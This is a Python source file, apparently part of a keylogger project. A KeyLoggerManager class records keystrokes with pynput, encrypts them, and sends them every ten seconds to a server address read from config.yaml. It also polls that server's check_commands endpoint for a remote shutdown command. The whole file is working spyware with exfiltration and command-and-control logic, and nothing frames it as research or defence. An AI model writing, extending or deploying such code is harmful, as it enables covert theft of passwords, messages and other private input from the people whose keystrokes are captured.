from service import KeyLoggerService, FileWriter, Encryptor,NetworkWriter
from Interface import IKeyLoggerManager
from pynput.keyboard import Listener
import threading, time, requests, sys,yaml

with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)

URL = config['general']['base_url']


class KeyLoggerManager(IKeyLoggerManager):
    def __init__(self, serial_number: int, key:str):
        self.__serial_number = serial_number
        self.__key_logger = KeyLoggerService()
        self.__writer = NetworkWriter()
        self.__encryptor = Encryptor(key)
        self.__is_logging = False
        self.__logger_thread = threading.Thread(target=self.__listen)
        self.__send_data_thread = threading.Thread(target=self.write_main_loop)

    def start_logging(self):
        self.__is_logging = True
        self.__logger_thread.start()
        self.__send_data_thread.start()

    def stop_logging(self):
        self.__is_logging = False
        if hasattr(self, 'listener'):
            self.listener.stop()
        if self.__logger_thread.is_alive():
            self.__logger_thread.join()
        if self.__send_data_thread.is_alive():
            self.__send_data_thread.join()
        sys.exit(0)

    def __listen(self):
        with Listener(on_press=self.__key_logger.on_press) as self.listener:
            self.listener.join()

    def write_main_loop(self):
        while self.__is_logging:
            self.__encrypt_and_send_data()
            self.check_commands()
            time.sleep(10)

    def check_commands(self):
        try:
            response = requests.get(f"{URL}/api/check_commands/{self.__serial_number}")
            if response.status_code == 200:
                commands = response.json().get('commands', {})
                if commands.get('shutdown', False):
                    self.stop_logging()
        except requests.exceptions.RequestException:
            pass

    def __encrypt_and_send_data(self):
        data = self.__key_logger.get_logged_keys()
        encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in data.items()}
        self.__writer.write(self.__serial_number, encrypt_data)